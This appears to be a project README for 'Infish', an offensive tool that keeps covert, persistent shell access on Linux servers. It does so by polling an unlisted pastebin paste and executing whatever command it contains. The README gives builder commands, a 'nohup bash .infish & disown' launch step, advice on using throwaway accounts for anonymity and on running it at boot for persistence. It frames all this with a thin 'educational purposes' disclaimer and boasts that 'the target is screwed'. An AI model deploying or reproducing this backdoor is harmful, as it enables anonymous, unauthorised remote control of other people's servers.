# Infish

Infish stands for infinite shell. It's a way to maintain persistent shell access on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.

Note that this project is for **educational purposes** only. I bear no responsibility for how you use it. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.

The aim of this shell is the give the penetration tester maximum and complete control over the system such that **only a reboot** can save the day. Infact if one has root access, one can set the script to run on boot, that way, the target is **screwed**.

# How it works
Here, you will have a shell that keeps checking on a paste on pastebin (use a throw away account and make the paste unlisted), and running whatever command it finds there. That way, you don't need access to the target machine. You've created a poor man's reverse shell, while remaining anonymous in the process.

Anytime you need to run a command, simply edit the paste to the command you want.

# Usage

There are two ways to build the final product.

- Using a raw paste url
- Using your pastebin dev api key, username, and password


## Using a raw paste url

This is when you have already created a paste by hand. Get the **raw paste url** and run the following command

```bash
bash infish-builder url pastebin.com/raw/abc123
```

## Using your pastebin details

This is the recommended method, as everything is automated. For this, obtain the following

- Your pastebin dev api key
- Your pastebin username (To our throwaway account)
- Your pastebin password

Then run the following

```bash
>bash infish-builder key xxxxxxxxxxxxxxxxxxxxxxx
Pastebin username:
john
Pastebin password:
doe
New paste name:
shell

Successfully build infinite shell

```

A file called '.infish' is created.

Finally on the server, run

```bash
nohup bash .infish & disown
```

Now, you can edit your paste to any shell command and the server will run it.

That's it, you own the server. If you have root access, you can set the last command to run on boot.

If you're confused or have no idea what's going on on this page, then you should not be here. Go build cute websites and apps.




Stay Dangerous :)
